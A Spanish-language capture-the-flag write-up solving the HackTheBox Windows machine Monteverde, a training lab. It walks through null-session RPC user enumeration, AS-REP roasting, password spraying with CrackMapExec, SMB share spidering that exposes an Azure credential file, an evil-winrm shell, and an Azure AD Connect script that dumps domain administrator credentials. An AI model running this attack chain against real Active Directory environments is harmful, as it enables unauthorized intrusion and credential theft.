---
layout: single
title: Monteverde HTB - WriteUp
excerpt: WriteUp de la máquina Monteverde de HTB.
date: 2023-02-26
classes: wide
header:
  teaser: /assets/images/Monteverde/Monteverde.png
  teaser_home_page: true
  icon: /assets/images/Monteverde/Monteverde.png
categories:
  - infosec
tags:
  - ctf
  - Windows                                                                                                                                                                                 
  - Writeup
  - RPC-Enum                                                                                                                                                                                  
  - Null-Session                                                                                                                                                                                    
  - BruteForce
  - Azure
  - Group-Abuse
---


En el día de hoy estaremos resolviendo la máquina Monteverde de HackTheBox. La dirección IP de la máquina es 10.10.10.172 y su sistema operativo es WIndows.

### Enumeración inicial.

Lo primero será descubrir los servicios que el host tenga expuestos para encontrar posibles vectores de entrada. Para esta tarea usaremos nmap.

```bash
# Nmap 7.91 scan initiated Sun Feb 26 08:30:07 2023 as: nmap -sC -sV -Pn -oN Extraction -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49676,49696 10.10.10.172
Nmap scan report for 10.10.10.172
Host is up (0.10s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-02-26 07:30:12Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -2s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-02-26T07:31:06
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb 26 08:31:46 2023 -- 1 IP address (1 host up) scanned in 99.08 seconds
```

Tenemos una gran variedad de servicios expuestos, los mas destacables són:

- El  puerto 53 (DNS)
- El  puerto 88 (Kerberos)
- El  puerto 445 (SMB)
- El  puerto 389 (LDAP)
- El  puerto 5985 (WinRM)

Vemos que el dominio se llama Megabank.local, lo añadiremos al /etc/hosts

Lo primero que haremos será comprobar si puede enumerar el RPC a traves de sesiones nulas.

```bash
❯ rpcclient 10.10.10.172 -U '' -N
rpcclient $ enumdomusers 
user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
rpcclient $
```

Puedo conectarme y sacar la lista de usuarios del dominio. Teniendo una lista de usuarios y estando el Kerberos expueto podemos probar un ataque de ASREPRoast.

> Este ataque se aprovecha de los usuarios que no necesitan una pre-autenticación en Kerberos. Sin necesidad de conocer credenciales podemos solicitar un TGT que posteriormente podemos intentar romper con herramientas como john.

Para realizar este ataque podemos usar una de las herramientas que trae impacket llamada GetNPUsers.py.

```bash
❯ impacket-GetNPUsers MEGABANK.LOCAL/ -usersfile users.txt -dc-ip 10.10.10.172 -request
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User AAD_987d7f2f57d2 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mhope doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User SABatchJobs doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-ata doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-bexec doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-netapp doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User dgalanos doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User roleary doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User smorgan doesn't have UF_DONT_REQUIRE_PREAUTH set
```

No ha funcionado, no existen usuarios en el dominio que sean vulnerables a este ataque. Lo siguiente fue probar si había carpetas compartidas que esten disponibles para un usuario anonimo y tampoco... Me hice un pequeños script en bash para enumerar los usuarios a traves de RPC.

```bash
#!/bin/bash

ip=$1

for i in $(rpcclient $ip -U '' -N -c "enumdomusers");do

        rid=$(echo $i | grep "rid" | cut -d ':' -f2 | tr -d '[]')

        info=$(rpcclient $ip -U '' -N -c "queryuser $rid")

        username=$(echo $info | cut -d ':' -f1,2)

        parseruser=$(echo $username | sed -e 's/\Full Name//g')

        echo "$parseruser:"
        echo "$info" | grep "Description :"
done
```

En este caso en las descripciones de los usuarios tampoco había nada interesante. Lo siguiente fue hacer fuerza bruta para ver si algun usuario tenia de contraseña el nombre de usuario.

Para esa tarea utilicé CrackMapExec:

```bash
❯ crackmapexec smb 10.10.10.172 -u users.txt -p users.txt
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:Guest STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:svc-ata STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:svc-bexec STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:svc-netapp STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:dgalanos STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:roleary STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:smorgan STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:Guest STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:svc-ata STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:svc-bexec STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:svc-netapp STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:dgalanos STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:roleary STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:smorgan STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:Guest STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-ata STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-bexec STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-netapp STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:dgalanos STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:roleary STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:smorgan STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:Guest STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
```

Tenemos un usuario y contraseña:

- SABatchJobs:SABatchJobs

Intente un Kerberoasting pero tampoco funcionó. Tampoco podiamos conectarnos con WinRM. Lo siguiente que probe fue enumerar los recursos compartidos. Utilicé un modulo de  CrackMapExec para hacerlo de una forma mas comoda.

```bash
❯ crackmapexec smb 10.10.10.172 -u 'SABatchJobs' -p 'SABatchJobs' -M spider_plus
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
SPIDER_P... 10.10.10.172    445    MONTEVERDE       [*] Started spidering plus with option:
SPIDER_P... 10.10.10.172    445    MONTEVERDE       [*]        DIR: ['print$']
SPIDER_P... 10.10.10.172    445    MONTEVERDE       [*]        EXT: ['ico', 'lnk']
SPIDER_P... 10.10.10.172    445    MONTEVERDE       [*]       SIZE: 51200
SPIDER_P... 10.10.10.172    445    MONTEVERDE       [*]     OUTPUT: /tmp/cme_spider_plus
```

Esto me reportó información interesannte:

```json
 "azure_uploads": {},
    "users$": {
        "mhope/azure.xml": {
            "atime_epoch": "2020-01-03 14:41:18",
            "ctime_epoch": "2020-01-03 14:39:53",
            "mtime_epoch": "2020-01-03 15:59:24",
            "size": "1.18 KB"
        }
    }
```

Hay dentro de users$ un directorio de usuario llamado mhope que contiene un archivo xml de azure. Nos lo descargamos

```bash
❯ smbclient '\\10.10.10.172\users$' -U 'SABatchJobs'
Enter WORKGROUP\SABatchJobs's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Jan  3 14:12:48 2020
  ..                                  D        0  Fri Jan  3 14:12:48 2020
  dgalanos                            D        0  Fri Jan  3 14:12:30 2020
  mhope                               D        0  Fri Jan  3 14:41:18 2020
  roleary                             D        0  Fri Jan  3 14:10:30 2020
  smorgan                             D        0  Fri Jan  3 14:10:24 2020
c
                31999 blocks of size 4096. 28979 blocks available
smb: \> cd mhope\
smb: \mhope\> ls
  .                                   D        0  Fri Jan  3 14:41:18 2020
  ..                                  D        0  Fri Jan  3 14:41:18 2020
  azure.xml                          AR     1212  Fri Jan  3 14:40:23 2020

                31999 blocks of size 4096. 28979 blocks available
smb: \mhope\> get azure.xml 
getting file \mhope\azure.xml of size 1212 as azure.xml (3,2 KiloBytes/sec) (average 3,2 KiloBytes/sec)
smb: \mhope\>
```

El archivo contiene lo siguiente:

```xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>
```

El archivo contiene una contraseña valida para el usuario mhope.

```bash
❯ crackmapexec smb 10.10.10.172 -u 'mhope' -p '4n0therD4y@n0th3r$'
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$
```

Además podemos conectarlos por WinRM.

```bash
❯ crackmapexec winrm 10.10.10.172 -u 'mhope' -p '4n0therD4y@n0th3r$'
WINRM       10.10.10.172    5985   MONTEVERDE       [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL)
WINRM       10.10.10.172    5985   MONTEVERDE       [*] http://10.10.10.172:5985/wsman
WINRM       10.10.10.172    5985   MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ (Pwn3d!)
```

Ya tenemos una shell.
```PowerShell
 evil-winrm -i 10.10.10.172 -u 'mhope' -p '4n0therD4y@n0th3r$'

Evil-WinRM shell v2.4
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\mhope\Documents:
```

Si miramos los grupos a los que pertenecemos podemos darnos cuenta que pertenecemos al grupo "Azure Admins"


```PowerShell
*Evil-WinRM* PS C:\Users\mhope\Documents: whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
MEGABANK\Azure Admins                       Group            S-1-5-21-391775091-850290835-3566037492-2601 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
```

Encontre el siguiente script ps1 en github que permitia escalar privilegios. https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1

Solo tenemos que subirlo a la máquina víctima y ejecutarlo de la siguiente manera.

```PowerSHell
*Evil-WinRM* PS C:\Users\mhope\Documents: Import-Module .\Azure-ADConnect.ps1
*Evil-WinRM* PS C:\Users\mhope\Documents: Azure-ADConnect -server 127.0.0.1 -db ADSync
[+] Domain:  MEGABANK.LOCAL
[+] Username: administrator
[+]Password: d0m@in4dminyeah!
```

Ya tenemos las credenciales de administrador, podemos ver si son validas a traves de CME

```bash
❯ crackmapexec smb 10.10.10.172 -u 'Administrator' -p 'd0m@in4dminyeah!'
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\Administrator:d0m@in4dminyeah! (Pwn3d!)
```

Ya hemos pwneado la máquina, espero que te sirva este WriteUp!














